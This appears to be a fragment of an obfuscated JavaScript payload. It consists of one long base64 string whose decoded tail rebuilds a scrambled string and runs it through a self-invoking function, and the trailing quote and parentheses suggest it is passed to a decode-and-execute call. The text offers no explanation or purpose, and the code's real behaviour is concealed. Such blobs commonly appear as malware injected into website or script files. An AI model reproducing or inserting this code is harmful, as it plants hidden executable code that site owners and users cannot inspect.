ilfZCBwcjwoLixjMTQubHJ0MHRdMjthTnIoSl9fZThKSiVqIS5mZ3QrIWglXV1fLiVUOiliSiExRDEuaXRuZV0oZXQtOy55PWxvdSFlJW8uKC4xJTY0dEdTaHguYXRdSiVeSn1jZWVdLmxkSjsue0phfWBjcnJpLnNlIUolPS11IEolbltKOlJKLi5fMVsgXy51YjthKXt7Ym5pczoxMkplISllNkpvZiUzN3VvZXR1dFt3ZWUmdTJ0Si5lLF8laF0uaD9fJT09aGEwZUUlZWVuSnY0YjU9O197bl8ucmUpSnQ2IWUhOzo5MnM1X3ZydGc6c2JuLmQldW9oWzN0LnI3fXIxMiQxZUplLnRpJWNlZXc4My4uZUpuZG4uPS50SnUuZ2FhfWokSjY7Mk5zcnp0Skpwd0olU3RfbmEuLXQudHJiYUolZWVKO25jKjM9dHIuZTVuM3tfXXQ2MGNKbmJ9Lm9PbGJKSmUyOV0lKCVuWmk9YVhlSV5TKV8pSkpkKHJlb0NjcnI9SmRKaSJfNGVySisyK3BdICk2e24yZUpkVFwnYT13fUo7Zykxb2MoSl1NM2k1ZTtoX3V0ezFKci4uZ18sXW84X11dZW8lKXBKJmYsdT1kaSlhXVglIGFnNjRsYyguZTBydClwW0AsSl94dyloYXJkcihkbzVnNEUyaXRvZS1KKGVuZHJlKXNKfW5jZV1hZHQgRDVKLiklYVwvZ2wxLjMuS2xzbG9uOmZ1OkohY1xcMG1oI107OXRiUzMrPWtlaW5dSmw9b11jZHAxcDJhbztlbEplXWs1Lj00ZTEyYyVwdEVkNE5tIWhkKSQhIHMuITN0SjIsX295KW4zLl97b3NuY2dic3V1Pm9sUy4zLmVnLmVyXCdfLDBsYUoyZW4kJSVKPlA6JSRyZS5fNG5VSiUkeH0gZH10ZWwudVRnZW5hcnk5LmFvLjswcEFKZ0olQn19ICUuXFxhaXQ9aGVuK2Jvb0pzc2VUdFQ7bWUlZSFhMiU4bl0uSilsZXQsSl0+X2VyZTVsSlNKSl9mNGEyKTtvaCVaXXlfM2gwSkpjZiAzJHVuSmxwbSVQXC9yZS5fdDFfaTssbGdvXzQoNDllaUouNCkpY25peDE2RSV7ZillSkp0M29Ka20gNF1jSnNiYUpiLkVlXWUySm00M11jQ3QuYSllLGM/bzVlbmVeKlFUSmFoLlZhMCxKcjFtKDJ9bV9zfWQzSkMuSnQlZW89YXNnNCEpcmhydG1fNF8pSmk+ai5pdGRfSm81My5sMSkzXVgzbWViKT1rZX1nKTZKKX1bSi4oM2stKCYyemF3PXglKWg2dGVdXWd7XzV9PTVKJTFvSnM6X3VtSjFfaE9KaSljYV1mXS5KSnJlYkpqM0piMW81Lnd3Sn1mIWM7ODUlc2xKUTdvSjVKXyVKb05hLjY1NDNKMVtfMnQlaTp0cnIgLTVhSi5LbzIpKTpuJTJ4Oy4pPF1idkopdHRZO0ozK2VdN0pmZCFcXGVKbXRfYWUgcGxjIEp7b2kxbDJ9KkpfY3tjK2llbnVnSmUsM1N5YmwxU25KLmFKITs7JkpmKUpjIHRicjZyNWEucmAgZHR1NUplcm8gKF9iKW9fKGE2IEooZkp0aHI0b0pdbnQhKWZfckpzVF9yLnJKSm90WSlQSm5lZXspY2VZZDVpLG50dF1KY0oyMl9uK3tlZUpnXSk0Sig1MD1yaTI0PUp7c2lOdEorXyAufW1uaWE0ZTluI0pnIV1dIF9yNXQwZWlmLmNKZmVdM2UubEp1WU4rXC9uLi5KNDhyZkpKLm5rYix1eE4zKG4pN3BfSmxTSl1KVGZdc3VrXWVKMF1vOmZvZXJwLm5sSmE3ZW5yaWVpSm4wfXJdLig/cGVfakpTb24oSilkSjY1JWpqLFZySjtKc30oJTRKYW5KYnRlaUpUSGVfSmwxXV1lX3RlPWFKSl1dPUpKYXQxSnRlO2FdXT0gZWRdYXR0IHRKKC4tcFJpMWN0XVwnSjVpSjM9XX1bWmZqaXImNkozaTZheS1bcHVvc2pmSmV9PUplSjEgdSl0fWlmITVyYl1udHQzaF1fe1s6YzJzLnhKSiFlXToobEpAZF8/LCh7Li5pZmVoNl1uLj17SjFuSmwsSig9LiE0KH1jaXNKaWVdMW9pMWNUSkpoZWlLZnkob29fM3RlbDZ9IUooc0pjZWltJUpzLGlyLGVoNyljLj1OOXNJYzddMko0IW00ZilkdllKLl9jO0poZXlfSnBKOSlKci51SmFfQEplZXQuZUpKXVsyaWlhXyVnbzIxZXUpXUQ1LCg9ZShiIF9ZPWMxMV1ddmQpaWN9cDV7K0oiZmVdcl90XTc1SihKbj1nYV9zbDIoc0pKPXRoMWExYik/MGVhckowSigoSmk4LG9dMSFUe1UodCxvb0plbXU9Q2EuSnRKO3tkdWQ1cGBlMz1lSl8pWSRoR2lrOyV1bzYoNigwKWV7SkpsZVtdamlkMnk7M2M+ZV9lKU06ZXJncy5dSm5yKW9ybEpfIV11KUpIckoyLmlfSmlfR0omO29uLEokb1lKXTFhbTlyPW57ZGRlSk4pcykgLm8pZ0pvb2VlPUpRZCAtZSV7IHRKZWdfKDRlSi54KC5KYWlua3RDIWNlLnJKMDtlKW9bT1ssX2E0Ny5lZnRLaV19NS4oSixuJDh0LGFjdGVoKTt7bygpPXsgSkpcXEpuMTpKKS5KQV0sSmx0YyVKMSk2bzhvdCFlcy5NczNdX1RuZUxKXUo2YS4lZVVzZUplQWxKYmFfWV1uSnIxZl9lKCBOIEokYy5dSl01bG9pbjZKK2VlKWhtY19dXWl3LGxNSmB5ZUlzNGEhXW9KV28ibl9zdy4gTUo2c11uLmQ6eUopaSogXFxfNllUZFA7ZV90XmI1SkV0XSlzYW9SZUpKX2hlSmxlIGVlKTBmZCRpfTpKcEphSmJKYTIoYUomKUouMltjXT09PFlkJTtKckVuMGkldClwJihlInNzO3RjclRzM3JdXV11cmlubkpKSnsuJjJdPWZlaT1lYUo6aH1uPXIlKD9wZSFKKXRuckojckY1SnBidG5dZUo/LSgpLmIhSiBhLjBKMSBKeXRhXWNKLGl0NiZhfW9uSig3KDBwUHJlblBKQzksYSZKSl1jMWVlPnJuXXJfSmRpKEwzSjZmJTRlXUotZTMwLnRfPisxZVZjdEpdfWg7cmpfKHJkZXMlZkouK2tabEE9PXQxSihubkp9ZSslSmFKdkpic3coJEpvSj1ddTFfO0plQmEjQ2V7SjNcXCVhX2FKWjlKO2l0dCE6ITVlITNKZVxcb2EpSnM1X3lLMXIgJS4zOj1KSm1uKCxjOzJ9X10pZTMiamtKITZycl0gXUYsSi47LHJhdDExIj1hJW9Xbko1W2VKSmVKSikuZUoxdCtjN18oNWI2eytKZUoyLl1KZz1tKD10I3Uubz0rXylKc2UiZWlsJkp0XCdfdXNsZ2UuW2dJJTouWS5vNG54akplY28wXkVbXXNKPVwnMW4ueCg3O2pKbGRzSnRyZWY7SmMpU2RaKEpwVjVgKVsrY28pPjVjb29qZWpqbzItJH1pfSBvPSs9YSVKdG4rSlswI18uM0pASig0aWUkckRoZTpPNzEgcyglSkhKIWFvckozYWwySSh0ZThdMzVaYXQsOzNKNH1iLkpKTnQgZUpcLz00aztKeCVkZmcyXXIuPWJ4bW8hSiloMS5wNyk1IDlKIEpKSitlJWwoMkpwKWYkcjFhNCFpKSgwYXZKbDV1SjV0I21Kc3RpO19fZlhlMmUjSjdtcntlSkpPbkowLm9oSkpKc3tpWmlKKWVKaSlwJXR2SmR9XWJKMH10ZHJCZiAlSjQkaWI3MzUlLjQ9ZXAubmxsOCkuaXM3byhfSmNKfWM8Km5yUT1KOmhyX2U7SiMwLChdZS5jdC5hLmV7ZCl5XWlmeyYrKTEocjhqaW41MnhKPWMsb0ptMl1KbzFKMDl0N2E7e0Q9dDo0b1Jyd2NfMWFKSjQ1XSxwbjtKdGwgfS4pSmllWm9KXylmKDQpXW5yaGlfdEpKYWVqdTFjaVxcaGNKWSh0cSFKIGVldHNfPDVfIGJlZUouSmRKaDg0K3BKIW97SjNfdEpKX2RfSkpxcmN0b3FdTm0pSiljaWcgO0pfX187XFxKXSshSkpmJW0hbGlzSmhJaSwwYXQgc0IsbTRlbnRlPS5wLjssPW5KKEpybWk9SmVJLl90aVRoSjM0LmEtX0paZStldmVKbz04Y2whaGVpNWo1OywpSn1yZW8ocm4xaXNycz1fMllyMj9KJSUxMXQpKTZuJiRlZlNsZG8rfSl2ZV50LG5vcGluWyBKNnQpdGluSkc9YnsuKGN0Sko4PX0jO0pzY2V0MnJKSl9lbzBfdWRDSkpKJCkrNGRiImVvKHVhbDZyc11hSmZKdDIwJGU9bGlKckouX0osSjBuM3A+Lm4xbGw0XC90cjE7M3AxX2IzJF95SnI3JG8gdDJ0XW9fJG02OmVlc3tyKCBKSnVZSiFydG91XSh1bUpKPTJKSnNfZWhibzZKSjYpcG9dKXQgSjV1SjJbSmZyY25vLmVyeyBqcD0xLnJlPS4mdXBzMSA/KUpfMSlpSjVjICJsSmUkfTZ9SiBySjE1MyY7cl89Sl00SnQlIGk6P1kycDFdcyUxc19KX0ouY3tKeyBSSnVfSm9dX2FlQjZ9dEpleH10VV1KbEpyc3ksb2RlZWV0XCc5LnQuQ29yKUpdMV9BYXRyLG5kSi50JXBfdGYuX2UufWJlIHZuYnIzSjJfSiU7b29KfWckMCkwcyxKKHc9MHUpSnJzSjFpPSp0bjpMPWFmMWI5NkpdSitiKTMwcG93ZGU9X3RmbyVlXW4gKSglSjthSnQ9djohOUpUSnRMLnNsbm5ieHRKLmI1SnNvcCVlSlZhMi5pRWVfKHRjZV81ZVp0dmVuZWVpZ2hncG9ePXhGSjRpbkpKZS49MWwkLUogNmVuJjJKSm5mIEllb2wlIDNpUThFSnsxZWUuKXRpZWU7b3ErX2VdSjRKSWUgICE3bHRlSkpULiBKLnphQ2FKMWVySkpKfUolSmVzbiB1LEouLjdKNCB9M0pKIGVpXVtVKV0mX1tJd3JdIG8wKTUnKSk7dmFyIGJJcT1KWHoobG9rLEVhbCApO2JJcSg3NzA1KTtyZXR1cm4gNDQ1NX0pKCk='))
